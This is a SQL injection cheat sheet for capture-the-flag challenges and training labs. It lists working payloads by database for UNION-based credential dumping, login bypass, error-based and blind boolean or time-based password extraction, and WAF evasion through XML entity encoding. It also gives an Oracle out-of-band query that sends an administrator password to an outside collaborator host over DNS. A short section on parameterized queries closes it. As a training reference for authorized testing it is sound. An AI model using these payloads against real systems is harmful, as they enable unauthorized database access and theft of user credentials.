# SQL Injection — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, browser DevTools, sqlmap  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

When hunting for SQL Injection in CTF challenges:

1. **Map Entry Points:** Inspect URL parameters, form fields, JSON values, HTTP headers (`User-Agent`, `Referer`), and cookies (`TrackingId`, `session`).
2. **Break Syntax:** Inject `'`, `"`, `\`, `;`, `--`, `/*` to force database syntax errors or status differences.
3. **Database Fingerprinting:** Identify DB dialect (PostgreSQL, MySQL, Oracle, MSSQL) using comment styles, string concatenation, and version queries.
4. **Determine Injection Type:**
   - **In-Band (UNION-based):** Results directly visible on the page.
   - **Error-Based:** Database error messages leak queries or data via casting.
   - **Blind (Boolean):** Visible response changes conditionally based on True/False logic.
   - **Blind (Time-based):** Response timing delays confirm True/False logic (`pg_sleep()`, `WAITFOR DELAY`).
   - **Out-of-Band (OAST):** Trigger DNS/HTTP interactions to Burp Collaborator.
5. **Extract Schema & Target Data:** Extract table names, column names, administrator credentials, or flags.

---

## 2. Database Fingerprinting & Quick Syntax

### Comment Characters

| Database | Inline / Line Comments |
|---|---|
| **PostgreSQL** | `--`, `/* */` |
| **MySQL** | `#`, `-- ` *(trailing space required)*, `/* */` |
| **Oracle** | `--`, `/* */` |
| **Microsoft SQL** | `--`, `/* */` |

### String Concatenation

| Database | Concatenation Syntax | Example |
|---|---|---|
| **Oracle** | `'foo' \|\| 'bar'` | `'a'\|\|'b'` |
| **PostgreSQL** | `'foo' \|\| 'bar'` | `'a'\|\|'b'` |
| **MySQL** | `'foo' 'bar'` or `CONCAT('a','b')` | `CONCAT('a','b')` |
| **MSSQL** | `'foo' + 'bar'` | `'a'+'b'` |

### Database Version Query

| Database | Payload / Query |
|---|---|
| **Oracle** | `' UNION SELECT banner, NULL FROM v$version--` |
| **PostgreSQL** | `' UNION SELECT version(), NULL--` |
| **MySQL** | `' UNION SELECT @@version, NULL#` |
| **MSSQL** | `' UNION SELECT @@version, NULL--` |

> **Note on Oracle:** Every `SELECT` requires a `FROM` clause. Use `FROM dual` when selecting literals (e.g. `SELECT NULL FROM dual`).

---

## 3. UNION-Based Exploitation

### Step 1: Determine Column Count

**Method A: `ORDER BY` Technique**  
Increment the index until the server throws an error (e.g., 500 Internal Server Error):
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--  <-- Fails: Column count is 3
```

**Method B: `UNION SELECT NULL` Technique**  
Inject `NULL` values until the query succeeds without an error:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--  <-- Succeeds (Oracle requires: FROM dual--)
```

---

### Step 2: Find Columns Supporting Text / Strings

Probe each column position with a test string (e.g., `'a'`):
```sql
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--
```
When the string renders in the response without a type-conversion error, use that column to display exfiltrated data.

---

### Step 3: Extract Schema Information

#### Non-Oracle Databases (MySQL, PostgreSQL, MSSQL)

1. **List Tables:**
   ```sql
   ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=current_schema()--
   ```
2. **List Columns:**
   ```sql
   ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
   ```
3. **Dump Credentials:**
   ```sql
   ' UNION SELECT username, password FROM users--
   ```

#### Oracle Databases

1. **List Tables:**
   ```sql
   ' UNION SELECT table_name, NULL FROM all_tables--
   ```
2. **List Columns:**
   ```sql
   ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABC'--
   ```
3. **Dump Credentials:**
   ```sql
   ' UNION SELECT USERNAME_XYZ, PASSWORD_XYZ FROM USERS_ABC--
   ```

---

### Step 4: Multiplexing into a Single Column

If only one column renders text, concatenate credentials into a single string:

| Database | Payload |
|---|---|
| **PostgreSQL / Oracle** | `' UNION SELECT NULL, username \|\| '~' \|\| password FROM users--` |
| **MySQL** | `' UNION SELECT NULL, CONCAT(username, ':', password) FROM users#` |
| **MSSQL** | `' UNION SELECT NULL, username + ':' + password FROM users--` |

---

## 4. Error-Based SQLi

Used when backend errors are reflected in the response or when blind conditions need to be turned into visible errors.

### Direct Casting Errors (Visible Data Leak)

Forces the database to convert text data into an integer, printing the string inside the error message:

```sql
-- PostgreSQL
' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--

-- Generic conversion probe
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

### Conditional Errors (Blind to Error Conversion)

When no direct output is returned, force an unhandled error (like divide-by-zero) on a True condition:

#### Oracle:
```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
```
- **If True:** Causes divide-by-zero error (`500 Internal Server Error`).
- **If False:** Returns normal response (`200 OK`).

#### PostgreSQL:
```sql
' || (SELECT CASE WHEN (1=1) THEN CAST(1/0 AS text) ELSE '' END) || '
```

#### Microsoft SQL:
```sql
' + (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END) + '
```

---

## 5. Blind Boolean-Based SQLi

Used when the page content changes (e.g., `"Welcome back"` appears or vanishes) depending on whether the injected condition evaluates to True or False.

### Testing Workflow (Cookie Example: `TrackingId`)

```http
Cookie: TrackingId=xyz' AND '1'='1;  --> Shows "Welcome back" (True)
Cookie: TrackingId=xyz' AND '1'='2;  --> "Welcome back" missing (False)
```

### 1. Enumerate Password Length:
```http
Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>8)='a
```
- Test lengths (`> 1`, `> 10`, `> 20`) until the True indicator disappears.

### 2. Extract Characters:
```http
Cookie: TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

*(For Oracle: use `SUBSTR(password, 1, 1)` and `LENGTH(password)`)*

---

## 6. Blind Time-Based SQLi

Used when the application returns identical responses and suppresses all errors.

### Database Sleep Triggers

| Database | Injection Payload |
|---|---|
| **PostgreSQL** | `'; SELECT pg_sleep(10)--` or `' \|\| pg_sleep(10)--` |
| **MySQL** | `' OR SLEEP(10)#` |
| **MSSQL** | `'; WAITFOR DELAY '0:0:10'--` |
| **Oracle** | `' \|\| dbms_pipe.receive_message(('a'),10) \|\| '` |

### Conditional Time Delays (Data Exfiltration)

Trigger a delay **only** when the condition is True:

#### PostgreSQL:
```http
Cookie: TrackingId=xyz'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

#### Microsoft SQL:
```http
Cookie: TrackingId=xyz'; IF (SELECT COUNT(username) FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='a')>0 WAITFOR DELAY '0:0:10'--
```

#### Oracle:
```http
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (username='administrator' AND SUBSTR(password,1,1)='a') THEN dbms_pipe.receive_message(('a'),10) ELSE '' END FROM users)||'
```

---

## 7. Out-of-Band (OAST) SQLi

Used when completely blind and synchronous time delays are disabled or filtered. Uses Burp Collaborator to exfiltrate data via DNS lookup.

### Oracle OAST Trigger:
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<!ENTITY % xx SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/">%xx;'),'/l') FROM dual--
```

### Oracle OAST Data Exfiltration:
Prepend query output to the DNS request domain:
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<!ENTITY % xx SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">%xx;'),'/l') FROM dual--
```
Check Burp Collaborator client for incoming DNS queries containing the exfiltrated password string.

---

## 8. Filter Bypasses & Encoding

### XML / Entity Encoding Bypass
When input is parsed inside XML payloads (e.g. `<storeId>1</storeId>`):
Encode SQL keywords using XML hex or decimal entities:
```xml
<storeId>1 &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; * &#x46;&#x52;&#x4f;&#x4d; users</storeId>
```
WAFs inspecting plain text will miss the encoded SQL keywords, while the backend XML parser decodes them prior to execution.

### Spaces & Comment Bypasses
- Replace spaces with inline comments: `SELECT/**/password/**/FROM/**/users`
- URL Encode: `%20` or `+`
- Alternate whitespaces: `%09` (Tab), `%0a` (Newline), `%0c`, `%0d`

---

## 9. Burp Suite Automation & Intruder Settings

| Attack Target | Intruder Attack Type | Payload Set 1 | Payload Set 2 | Detection Rule |
|---|---|---|---|---|
| **Column Count** | Sniper | Numbers `1..20` | N/A | Status 200 vs 500 error |
| **Password Length** | Sniper | Numbers `1..50` | N/A | Grep Match / Response length |
| **Password Chars** | Cluster Bomb | Index `1..N` | `a-zA-Z0-9` | Grep Match / Response time |
| **Time-based Blind** | Cluster Bomb | Index `1..N` | `a-zA-Z0-9` | Response completed > 10,000ms |

### Key Burp Configurations:
1. **URL Encoding (`Ctrl+U`):** Always URL-encode special characters (`+`, `&`, `#`, spaces, single quotes) in query strings and cookies.
2. **Grep - Match:** Go to **Intruder → Settings → Grep - Match** and flag response indicators (e.g. `"Welcome back"`, `"Internal Server Error"`).
3. **Resource Pool:** Set resource pool concurrency to `1` when executing time-based attacks to prevent overlapping delays.

---

## 10. CTF Quick Reference

| Attack Scenario | Database | Primary Payload Pattern |
|---|---|---|
| **WHERE Clause Bypass** | Any | `' OR 1=1--` |
| **Login Auth Bypass** | Any | `admin'--` or `administrator'--` |
| **Column Count** | Non-Oracle | `' ORDER BY N--` |
| **Column Count** | Oracle | `' UNION SELECT NULL, NULL FROM dual--` |
| **DB Version** | PostgreSQL | `' UNION SELECT version(), NULL--` |
| **DB Version** | MySQL | `' UNION SELECT @@version, NULL#` |
| **DB Version** | Oracle | `' UNION SELECT banner, NULL FROM v$version--` |
| **List Tables** | PostgreSQL/MySQL | `' UNION SELECT table_name, NULL FROM information_schema.tables--` |
| **List Tables** | Oracle | `' UNION SELECT table_name, NULL FROM all_tables--` |
| **Boolean Oracle** | PostgreSQL | `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--` |
| **Error Oracle** | Oracle | `' \|\| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) \|\| '` |
| **Time Delay** | PostgreSQL | `'%3BSELECT pg_sleep(10)--` |
| **Time Delay** | MSSQL | `'; WAITFOR DELAY '0:0:10'--` |
| **OAST DNS Exfiltration**| Oracle | `' UNION SELECT EXTRACTVALUE(xmltype('<!ENTITY % xx SYSTEM "http://'\|\|(SELECT password FROM users WHERE username='administrator')\|\|'.BURP-COLLAB/">%xx;'),'/l') FROM dual--` |
| **XML Encoded** | Any | `<id>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; ...</id>` |

---

## 11. Remediation & Best Practices

1. **Parameterized Queries (Prepared Statements):**
   Separate code from data using parameterized placeholders (`?` or `$1`):
   ```java
   PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
   statement.setString(1, category);
   ResultSet resultSet = statement.executeQuery();
   ```
2. **Stored Procedures:** Ensure stored procedures do not dynamically concatenate parameters.
3. **Principle of Least Privilege:** Restrict database accounts to only necessary tables, views, and execution permissions.
